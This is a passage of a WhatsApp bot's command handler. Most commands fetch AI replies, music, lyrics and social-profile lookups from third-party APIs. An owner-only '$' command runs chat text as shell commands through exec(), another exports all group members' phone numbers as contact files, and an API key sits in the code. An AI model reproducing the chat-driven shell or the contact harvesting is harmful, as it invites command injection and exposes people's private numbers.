            caption: `*Blackbox Ai Response:*\n\n\`\`\`${aiResponse}\`\`\`\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Blackbox case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'chatgpt': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.data;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/chatgpt.jpg', // Path to ChatGPT image
            },
            caption: `*ChatGPT Response:*\n\n\`\`\`${aiResponse}\`\`\``,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in ChatGPT case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }

    break;
}
case 'play':
case 'songs': {
    if (!text) {
        return reply(`\`No music title detected.\`\n*Example: ${prefix + command} Alan Walker - Faded*`);
    }

    try {
        await loading();

        // Search for the video using the provided query
        let search = await yts(text);
        let video = search.videos[0];
        if (!video) {
            return reply("No results found for the provided query.");
        }

        let { title, timestamp, views, ago, url, thumbnail } = video;

        // Send video details with a thumbnail
        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *Title:* ${title}\n👁️ *Views:* ${views}\n⏱️ *Duration:* ${timestamp}\n📅 *Uploaded:* ${ago}\n🌐 *URL:* ${url}\n\n> ${caption}`,
        });

        // Fetch audio details using the new API
        let apiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(url)}`;
        let res;

        try {
            res = await fetch(apiUrl);
        } catch (fetchError) {
            console.error("Error fetching API:", fetchError);
            return reply("Failed to fetch audio. Please check your connection and try again.");
        }

        let json;
        try {
            json = await res.json();
        } catch (jsonError) {
            console.error("Error parsing JSON:", jsonError);
            return reply("Failed to process API response. Please try again later.");
        }

        // Validate API response
        if (!json.success || !json.result || !json.result.download_url) {
            return reply("Failed to fetch audio. Please try again later.");
        }

        let { download_url, title: audioTitle, quality } = json.result;

        // Send the audio file
        await conn.sendMessage(m.chat, {
            audio: { url: download_url },
            mimetype: "audio/mp4",
            fileName: `${audioTitle} (${quality}).mp3`,
            caption: `🎶 *Title:* ${audioTitle}\n🔊 *Quality:* ${quality}\n📥 *Downloaded successfully!*`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play case:", error);
        reply("An unexpected error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'lyrics': {
                    if (!text) return reply(`\`No song title detected.\`\n*Example: ${prefix + command} Spectre Alan Walker*`);
                    await loading();

                    try {
                        // Construct the API URL
                        let apiUrl = `https://api.giftedtech.my.id/api/search/lyrics?apikey=gifted&query=${encodeURIComponent(text)}`;

                        // Fetch the lyrics data
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        // Validate API response
                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch lyrics. Please try again later.");
                        }

                        // Get the artist, title, and lyrics
                        let {
                            Artist,
                            Title,
                            Lyrics
                        } = json.result;

                        // Format the message with lyrics
                        let message = `🎶 *Artist:* ${Artist}\n🎵 *Title:* ${Title}\n\n*Lyrics:*\n${readmore}\`\`\`${Lyrics}\`\`\`\n> ${caption}`;

                        // Send the message with the lyrics and the image
                        await conn.sendMessage(from, {
                            image: {
                                url: './database/blueimages/lyrics.jpg'
                            }, // Image path
                            caption: `${message}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in lyrics case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'listcase': {
                    //let { listCase } = require('./lib/scrapelistCase.js')
                    setReply(listCase())
                }
                break
                case 'setppbot':
                case 'setpp': {
                    if (!isOwner) return setReply(mess.only.owner)
                    await loading()
                    if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    var medis = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                    if (args[0] == `full`) {
                        var {
                            img
                        } = await generateProfilePicture(medis)
                        await conn.query({
                            tag: 'iq',
                            attrs: {
                                to: botNumber,
                                type: 'set',
                                xmlns: 'w:profile:picture'
                            },
                            content: [{
                                tag: 'picture',
                                attrs: {
                                    type: 'image'
                                },
                                content: img
                            }]
                        })
                        fs.unlinkSync(medis)
                        reply(mess.success)
                    } else {
                        var memeg = await conn.updateProfilePicture(botNumber, {
                            url: medis
                        })
                        fs.unlinkSync(medis)
                        reply(mess.success)
                    }
                }
                break
                case 'google': {
                    if (!text) return reply(`\`No search query detected.\`\n*Example: ${prefix + command} Gifted Md*`);

                    await loading()

                    try {
                        let apiUrl = `https://api.giftedtech.my.id/api/search/google?apikey=gifted&query=${encodeURIComponent(text)}`;
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        if (json.status !== 200 || !json.success || !json.results || json.results.length === 0) {
                            return reply("Failed to fetch results or no results found.");
                        }

                        let results = json.results.slice(0, 5); // Limit to 5 results for brevity
                        let message = `🌐 *Google Search Results*\n\n🔍 *Query:* ${text}\n\n`;

                        results.forEach((result, index) => {
                            message += `${themeemoji} *${index + 1}.* \`${result.title}\` ${result.url}\n${result.description}\n\n`;
                        });

                        message += `> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: './database/blueimages/google.jpg'
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in google case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'happymod': {
                    if (!text) return reply(`\`No query detected.\`\n*Example: ${prefix + command} WhatsApp*`);

                    await loading();

                    try {
                        let apiUrl = `https://api.giftedtech.my.id/api/search/happymod?apikey=gifted&query=${encodeURIComponent(text)}`;
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        if (json.status !== 200 || !json.success || !json.results || !json.results.data) {
                            return reply("Failed to fetch results or no results found.");
                        }

                        let results = json.results.data.slice(0, 5); // Limit to 5 results for brevity
                        let message = `🎮 *HappyMod Search Results*\n\n🔍 *Query:* ${text}\n\n`;

                        results.forEach((result, index) => {
                            message += `${themeemoji} *${index + 1}.* *${result.name}*\n*Version:* ${result.version}\n[Download Here](${result.url})\n\n`;
                        });

                        message += `> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: './database/blueimages/happymod.jpg'
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in happymod case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                
                case 'hrt':
                case 'love': {

                    // Array of heart emojis to send one by one
                    const heartEmojis = [
                        '♥️', '❣️', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🔥',
                        '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💕',
                        '🫀', '💓', '💝', '💞', '💓', '💘', '💗', '💝', '💓'
                    ];

                    // Send the initial message
                    const loveMsg = await conn.sendMessage(m.chat, {
                        text: heartEmojis[0]
                    }, {
                        quoted: m
                    });

                    // Function to update the message with new emojis
                    const updateMessage = async (index = 1) => {
                        if (index < heartEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: loveMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: heartEmojis[index]
                                    }
                                }
                            }, {});

                            // Schedule the next update after 2 seconds
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };

                    // Start updating the message with heart emojis one by one
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'confuse':
                case 'conf': {
                    // Array of confused-themed emojis to send one by one
                    const confusedEmojis = [
                        '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨',
                        '🙃', '😬', '😯', '😖', '😑', '😳', '🤪', '🤯'
                    ];

                    // Send the initial confused emoji
                    const confuseMsg = await conn.sendMessage(m.chat, {
                        text: confusedEmojis[0]
                    }, {
                        quoted: m
                    });

                    // Function to update the message with new confused emojis
                    const updateMessage = async (index = 1) => {
                        if (index < confusedEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: confuseMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: confusedEmojis[index]
                                    }
                                }
                            }, {});

                            // Schedule the next update after 2 seconds
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };

                    // Start updating the message with confused emojis one by one
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'angry':
                case 'gtf': {
                    // Array of angry-themed stickers/emojis to send one by one
                    const angryEmojis = [
                        '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
                        '😾', '👺', '👊', '🗯️', '😒', '👎', '🥵', '🧨', '👹', '💣',
                        '😠', '👊', '💥', '😡', '🤬', '🔥', '🖕🏽'
                    ];

                    // Send the initial angry emoji
                    const angryMsg = await conn.sendMessage(m.chat, {
                        text: angryEmojis[0]
                    }, {
                        quoted: m
                    });

                    // Function to update the message with new emojis/stickers
                    const updateMessage = async (index = 1) => {
                        if (index < angryEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: angryMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: angryEmojis[index]
                                    }
                                }
                            }, {});

                            // Schedule the next update after 2 seconds
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };

                    // Start updating the message with angry emojis/stickers one by one
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'gitstalk': {
                    if (!text) return reply(`\`Please provide a GitHub username.\`\n*Example:* ${prefix + command} BLUEXDEMONl`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/gitstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch GitHub details. Please check the username and try again.");
                        }

                        const {
                            login,
                            avatar_url,
                            html_url,
                            name,
                            company,
                            location,
                            bio,
                            public_repos,
                            followers,
                            following,
                            created_at,
                            updated_at
                        } = json.result;

                        const message = `*GitHub User Details*\n\n` +
                            `👤 *Name:* ${name || 'N/A'}\n` +
                            `📂 *Username:* ${login}\n` +
                            `🏢 *Company:* ${company || 'N/A'}\n` +
                            `📍 *Location:* ${location || 'N/A'}\n` +
                            `📝 *Bio:* ${bio || 'N/A'}\n\n` +
                            `🔗 *Profile URL:* ${html_url}\n` +
                            `📦 *Public Repos:* ${public_repos}\n` +
                            `👥 *Followers:* ${followers}\n` +
                            `➡️ *Following:* ${following}\n\n` +
                            `📅 *Account Created:* ${new Date(created_at).toDateString()}\n` +
                            `🕒 *Last Updated:* ${new Date(updated_at).toDateString()}\n> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: avatar_url
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in gitstalk case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'wachannel': {
                    if (!text) return reply(`\`Please provide a WhatsApp Channel link.\`\n*Example:* ${prefix + command} https://whatsapp.com/channel/..`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/wachannel?apikey=gifted&url=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch channel details. Please check the URL and try again.");
                        }

                        const {
                            img,
                            title,
                            followers,
                            description
                        } = json.result;

                        const message = `*WhatsApp Channel Details*\n\n` +
                            `📌 *Title:* ${title}\n` +
                            `👥 *Followers:* ${followers}\n\n` +
                            `📄 *Description:*\n${description}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: img
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in wachannel case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'tiktokstalk': {
                    if (!text) return reply(`\`Please provide a TikTok username.\`\n*Example:* ${prefix + command} giftedtechke`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/tiktokstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (!json.success || !json.result) {
                            return reply("Failed to fetch TikTok user details. Please check the username and try again.");
                        }

                        const user = json.result.user;
                        const stats = json.result.stats;

                        const message = `*🎥 TikTok User Information*\n\n` +
                            `👤 *Username:* ${user.uniqueId}\n` +
                            `🎭 *Nickname:* ${user.nickname}\n` +
                            `🌎 *Region:* ${user.region || "Unknown"}\n` +
                            `✅ *Verified:* ${user.verified ? "Yes" : "No"}\n\n` +
                            `📄 *Bio:* ${user.signature || "No bio available"}\n` +
                            `🔗 *Profile Link:* [Visit Profile](https://www.tiktok.com/@${user.uniqueId})\n\n` +
                            `📊 *Statistics:*\n` +
                            `👥 *Followers:* ${stats.followerCount || 0}\n` +
                            `🔗 *Following:* ${stats.followingCount || 0}\n` +
                            `❤️ *Likes:* ${stats.heartCount || 0}\n` +
                            `🎥 *Videos:* ${stats.videoCount || 0}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: user.avatarLarger
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in tiktokstalk case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'obfuscate':
                case 'encrypt': {
                    if (!text) return reply(`\`No JavaScript code detected\`\n*Example:* ${prefix + command} console.log('blue demon');`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/tools/encrypt?apikey=gifted&code=${encodeURIComponent(text)}`;

                        // Fetch API response
                        const response = await fetch(apiUrl);

                        // Check for HTTP errors
                        if (!response.ok) {
                            console.error(`API returned status: ${response.status} ${response.statusText}`);
                            return reply("Failed to connect to the obfuscation service. Please try again later.");
                        }

                        const res = await response.json();

                        // Validate API response
                        if (res.status !== 200 || !res.success) {
                            console.error(`API error: ${JSON.stringify(res)}`);
                            return reply("Failed to obfuscate the provided code. Please ensure the code is valid and try again.");
                        }

                        const encryptedCode = res.encrypted_code;

                        // Send the obfuscated code with the image
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: './database/blueimages/obfuscate.jpg'
                            }, // Image path
                            caption: `*🔒 Obfuscated Code:*\n\n${readmore}\`\`\`${encryptedCode}\`\`\`\n> ${caption}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in obfuscate case:", error.message || error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'svcontact': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isAdmins) return setReply(mess.only.admins)
                    await loading();

                    try {
                        const groupMetadata = await conn.groupMetadata(m.chat);
                        const participants = groupMetadata.participants;
                        const groupName = groupMetadata.subject; // Group name
                        const totalContacts = participants.length; // Total number of contacts
                        const vcfFiles = [];
                        let vcfData = '';
                        let fileCounter = 1;
                        let contactCounter = 0;

                        for (let participant of participants) {
                            const contactNumber = participant.id.split('@')[0];
                            const contactName = participant.notify || participant.id.split('@')[0];
                            vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${contactNumber}:${contactNumber}\nEND:VCARD\n\n`;
                            contactCounter++;

                            if (contactCounter % 100 === 0 || participant === participants[participants.length - 1]) {
                                // Save the VCF data to a file
                                const vcfFileName = `./temp/contacts_file_${fileCounter}.vcf`;
                                fs.writeFileSync(vcfFileName, vcfData, 'utf8');
                                vcfFiles.push(vcfFileName);
                                vcfData = ''; // Reset for the next file
                                fileCounter++;
                            }
                        }

                        // Send each VCF file
                        for (let i = 0; i < vcfFiles.length; i++) {
                            const vcfFileName = vcfFiles[i];
                            const caption = `*Contact file ${i + 1}*\n\n*GROUP:* ${groupName}\n*CONTACTS:* ${totalContacts}\n> ${caption}`;
                            await conn.sendMessage(m.chat, {
                                document: {
                                    url: vcfFileName
                                },
                                fileName: `contacts_file_${i + 1}.vcf`,
                                mimetype: 'text/x-vcard',
                                caption
                            }, {
                                quoted: m
                            });
                            fs.unlinkSync(vcfFileName); // Delete the file after sending
                        }
                    } catch (error) {
                        console.error("Error in svcontact case:", error.message || error);
                        reply("An error occurred while processing the contacts. Please try again later.");
                    }
                    break;
                }
                case 'fancy':
                case 'style': {
                    if (!text) return reply(`\`Please provide the text to stylize.\`\n*Example:* ${prefix + command} Blue demon`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/tools/fancy?apikey=gifted&text=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);

                        // Check for HTTP errors
                        if (!response.ok) {
                            console.error(`API returned status: ${response.status} ${response.statusText}`);
                            return reply("Failed to connect to the fancy text service. Please try again later.");
                        }

                        const res = await response.json();

                        // Validate API response
                        if (res.status !== 200 || !res.success || !res.results || res.results.length === 0) {
                            return reply("Failed to generate fancy text. Please try again later.");
                        }

                        // Format the stylized text results
                        const styles = res.results
                            .filter(item => item.result.trim()) // Filter out empty results
                            .map((item, index) => `${themeemoji}. ${item.result}`)
                            .join('\n\n');

                        // Send the formatted response
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: './database/blueimages/fancy.jpg'
                            },
                            caption: `*Fancy Text Generator:*\n${readmore}\n${styles}\n\n> ${caption}`,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in fancy case:", error.message || error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'areact': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.autoreact = true; // Enable auto react
                        await setReply('`Successfully Activated AutoReact.`');
                    } else if (args[0] === 'off') {
                        global.autoreact = false; // Disable auto react
                        await setReply('`Successfully Deactivated AutoReact.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle AutoReact.\``);
                    }
                    break;
                }
                case 'restart':
                    if (!isOwner) return reply(mess.only.owner)
                    await loading()
                    reply(`*RESTARTING..*`)
                    await sleep(3000)
                    process.exit()
                    break
                case 'ffstalk':
                case 'freefirestalk': {
                    if (!text) return reply(`\`No UID and region detected\`.\n*Example:* ${prefix + command} 6974171054 ME`);

                    await loading();

                    try {
                        const [uid, region] = text.split(' '); // Split input to get UID and region

                        // Validate input
                        if (!uid || !region) {
                            return reply(`Invalid format. Please provide both UID and region.\n\n*Example:* ${prefix + command} 6974171054 ME`);
                        }

                        const apiUrl = `https://garena420ffapi.vercel.app/profile_info?uid=${encodeURIComponent(uid)}&region=${encodeURIComponent(region)}&key=Saidul`;

                        // Fetch data from the API
                        const response = await fetch(apiUrl);
                        const res = await response.json();

                        // Validate API response
                        if (!res.AccountInfo || !res.AccountInfo.AccountName) {
                            return reply("Failed to retrieve the player's data. Please check the UID or region and try again.");
                        }

                        const {
                            AccountInfo,
                            GuildInfo,
                            petInfo,
                            socialinfo
                        } = res;

                        // Format the message
                        const message = `🎮 *Free Fire Player info*\n\n` +
                            `*🆔 UID:* ${uid}\n` +
                            `*👤 Nickname:* ${AccountInfo.AccountName}\n` +
                            `*🌎 Region:* ${AccountInfo.AccountRegion}\n` +
                            `*📅 Created At:* ${new Date(AccountInfo.AccountCreateTime * 1000).toLocaleString()}\n` +
                            `*🏅 Level:* ${AccountInfo.AccountLevel}\n` +
                            `*❤️ Likes:* ${AccountInfo.AccountLikes}\n` +
                            `*🔥 BR Rank:* ${AccountInfo.BrMaxRank}\n` +
                            `*⚔️ CS Rank:* ${AccountInfo.CsMaxRank}\n` +
                            `*🏠 Guild Name:* ${GuildInfo?.GuildName || "None"}\n` +
                            `*🐾 Pet Name:* ${petInfo?.name || "None"} (Level: ${petInfo?.level || "N/A"})\n` +
                            `*🖊️ Signature:* ${socialinfo?.AccountSignature || "None"}\n` +
                            `\n> ${caption}`;

                        // Send the formatted message
                        reply(message);
                    } catch (error) {
                        console.error("Error in ffstalk case:", error);
                        reply("An error occurred while retrieving player data. Please try again later.");
                    }
                    break;
                }
                case 'broadcast': {
                    if (!isOwner) return reply(mess.only.owner);

                    if (!text) return reply(`\`No Message detected\`.\n*Example:* ${prefix + command} Hello, this is a broadcast message!`);

                    await loading();

                    try {
                        const groups = Object.values(await conn.groupFetchAllParticipating());
                        if (!groups.length) return reply("You are not part of any groups.");

                        // Inform about the number of groups and the message
                        reply(`📢 *Broadcast Preview:*\n\n*Message:* \`\`\`${text}\`\`\`\n\n*Groups* ${groups.length}\n\n🔃 *Broadcast will start shortly...*`);

                        let successCount = 0;
                        let failCount = 0;

                        for (const group of groups) {
                            try {
                                await conn.sendMessage(group.id, {
                                    text: `📣 *BROADCAST MESSAGE:* 📣\n\n*Message* ☛ \`\`\`${text}\`\`\`\n\n> ${caption}`
                                });
                                successCount++;
                                await sleep(1000); // Optional delay to avoid rate-limiting
                            } catch (error) {
                                console.error(`Failed to send message to group ${group.id}:`, error);
                                failCount++;
                            }
                        }

                        reply(`✅ Broadcast completed.\n\n*Success:* ${successCount}\n*Failed:* ${failCount}`);
                    } catch (error) {
                        console.error("Error in broadcast case:", error);
                        reply("An error occurred while broadcasting. Please try again later.");
                    }
                    break;
                }
                case '$': {
                    if (!isOwner) return setReply(mess.only.owner)
                    await loading()

                    // Execute the shell command
                    exec(q, async (err, stdout) => {
                        if (err) return reply(`Error:~ ${err}`);
                        if (stdout) {
                            await reply(`*>_ Console*\n\n${stdout}`);
                        }
                    });
                    break;
                }
                case 'exchange': {
                    if (!args[0] || !args[1] || !args[2]) return reply('`Invalid Input or Format`\n*Example: exchange 100 USD EUR*');
                    await loadingx()
                    const amount = parseFloat(args[0]);
                    const fromCurrency = args[1].toUpperCase();
                    const toCurrency = args[2].toUpperCase();

                    if (isNaN(amount)) return reply('*Please enter a valid amount*.');

                    try {
                        // Send request to ExchangeRate API
                        const apiKey = '43f31fb84c391ced11b216a4';
                        const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;

                        const response = await axios.get(url);
                        const exchangeRate = response.data.conversion_rate;

                        // Calculate converted amount
                        const convertedAmount = (amount * exchangeRate).toFixed(2);

                        // Reply with conversion result
                        reply(`💱 *CURRENCY EXCHANGE* 💱\n\n*Amount:* *\`${amount} ${fromCurrency}\`*\n*Converted Amount:* *\`${convertedAmount} ${toCurrency}\`*\n*Exchange Rate:* *\`1 ${fromCurrency} = ${exchangeRate} ${toCurrency}\`*
> ${caption}`);
                    } catch (error) {
                        console.error(error);
                        reply('Error: Unable to retrieve exchange rates. Please try again later.');
                    }
                    break;
                }
                case 'truth': {
                    try {
                        await loading();

                        const apiUrl = 'https://api.giftedtech.my.id/api/fun/truth?apikey=gifted';
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch a truth question. Please try again later.");
                        }

                        let truthQuestion = json.result;

                        reply(`*💡 Truth Question:*\n\n\`\`\`${truthQuestion}\`\`\`\n\n> ${caption}`);
                    } catch (error) {
                        console.error("Error in truth case:", error);
                        reply("An error occurred while fetching a truth question. Please try again later.");
                    }
                    break;
                }
                case 'flirt': {
                    try {
                        await loading();

                        const apiUrl = 'https://api.giftedtech.my.id/api/fun/flirt?apikey=gifted';
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch a flirt message. Please try again later.");
                        }

                        let flirtMessage = json.result;

                        reply(`*💘 Flirt Message:*\n\n\`\`\`${flirtMessage}\`\`\`\n\n> ${caption}`);
                    } catch (error) {
                        console.error("Error in flirt case:", error);
                        reply("An error occurred while fetching a flirt message. Please try again later.");
                    }
                    break;
                }
                case 'jokes': {
                    await loading(); // Show loading message while fetching data
                    try {
                        // API URL to fetch jokes
                        const apiUrl = 'https://api.giftedtech.my.id/api/fun/jokes?apikey=gifted';

                        // Fetch the joke from the API
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate the API response
                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch a joke. Please try again later.");
                        }

                        // Get the joke details
                        const {
                            type,
                            setup,
                            punchline
                        } = json.result;

                        // Prepare the joke message
                        const jokeMessage = `*😁 Joke Type:* ${type}\n\n\`\`\`${setup}\`\`\`\n😅 \`\`\`${punchline}\`\`\``;

                        // Send the joke message to the chat
                        reply(jokeMessage);
                    } catch (error) {
                        console.error("Error in jokes case:", error);
                        reply("An error occurred while fetching the joke. Please try again later.");
                    }
                    break;
                }
                case 'npmcheck': {
                    if (!text) return reply(`Please provide the NPM package name.\n\n*Example:* ${prefix + command} yarn`);

                    await loading(); // Display loading message
                    try {
                        // API URL with the query parameter
                        const apiUrl = `https://api.popcat.xyz/npm?q=${encodeURIComponent(text)}`;

                        // Fetch the NPM package details
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate the response
                        if (!json.name) {
                            return reply("Package not found or invalid response. Please check the package name.");
                        }

                        // Extract package details
                        const {
                            name,
                            version,
                            description,
                            keywords,
                            author,
                            author_email,
                            last_published,
                            maintainers,
                            repository,
                            downloads_this_year,
                        } = json;

                        // Format the response
                        const npmDetails = `
📦 *Package Name:* ${name}
🔖 *Version:* ${version}
📜 *Description:* ${description}
🔑 *Keywords:* ${keywords || 'N/A'}
👤 *Author:* ${author} (${author_email || 'N/A'})
🗓️ *Last Published:* ${last_published}
🛠️ *Maintainers:* ${maintainers}
🔗 *Repository:* ${repository || 'N/A'}
📥 *Downloads This Year:* ${downloads_this_year || 'N/A'}
        `;

                        // Send the package details as a reply
                        reply(npmDetails.trim());
                    } catch (error) {
                        console.error("Error in npmcheck case:", error);
                        reply("An error occurred while fetching the package details. Please try again later.");
                    }
                    break;
                }
                case 'translate': {
                    if (!args[0]) return reply(`\`Please provide a target language.\`\n*Example: ${prefix + command} en hello*\n*Or reply to a message with: ${prefix + command} en*`);

                    const targetLang = args[0];
                    const textToTranslate = m.quoted?.text || args.slice(1).join(' '); // Check if replying to a message or taking input
                    if (!textToTranslate) return reply(`\`Please provide text to translate or reply to a message.\``);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/translate?to=${encodeURIComponent(targetLang)}&text=${encodeURIComponent(textToTranslate)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.translated) {
                            return reply("Failed to translate the text. Please try again later.");
                        }

                        // Send the translated text
                        reply(`*🌐 Translated to ${targetLang.toUpperCase()}:*\n\n\`\`\`${json.translated}\`\`\``);

                    } catch (error) {
                        console.error("Error in translate case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'encode': {
                    const textToEncode = m.quoted?.text || args.join(' '); // Check if replying to a message or taking input
                    if (!textToEncode) return reply(`\`Please provide text to encode or reply to a message.\`\n*Example: ${prefix + command} hello*`);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/encode?text=${encodeURIComponent(textToEncode)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.binary) {
                            return reply("Failed to encode the text. Please try again later.");
                        }

                        // Send the encoded text
                        reply(`*🔢 Encoded Binary:*\n\n${json.binary}`);

                    } catch (error) {
                        console.error("Error in encode case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'decode': {
                    const binaryToDecode = m.quoted?.text || args.join(' '); // Check if replying to a message or taking input
                    if (!binaryToDecode) return reply(`\`Please provide binary code to decode or reply to a message.\`\n*Example: ${prefix + command} 01101101111*`);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/decode?binary=${encodeURIComponent(binaryToDecode)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.text) {
                            return reply("Failed to decode the binary. Please ensure the input is valid binary and try again.");
                        }

                        // Send the decoded text
                        reply(`*🔤 Decoded Text:*\n\n\`\`\`${json.text}\`\`\``);

                    } catch (error) {
                        console.error("Error in decode case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'owner':
                case 'creator':
                case 'dev': {
                    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender;
                    let pp = await conn.profilePictureUrl(who).catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
                    let name = await conn.getName(who);

                    await conn.sendContactArray(m.chat, [
                        [`2347041039367@s.whatsapp.net`, `BLUE DEMON`, `Bot Developer`, `Feel free to contact me for assistance or inquiries.`]
                    ], m);

                    await reply(`Hello 👋, if you wish to contact the owner, please use the provided contact details.`);
                }
                break;
                case 'script':
                case 'repo':
                case 'sc': {
                    try {
                        await loading();

                        // Send an initial confirmation image or message
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: './database/blueimages/bluex.jpg'
                            },
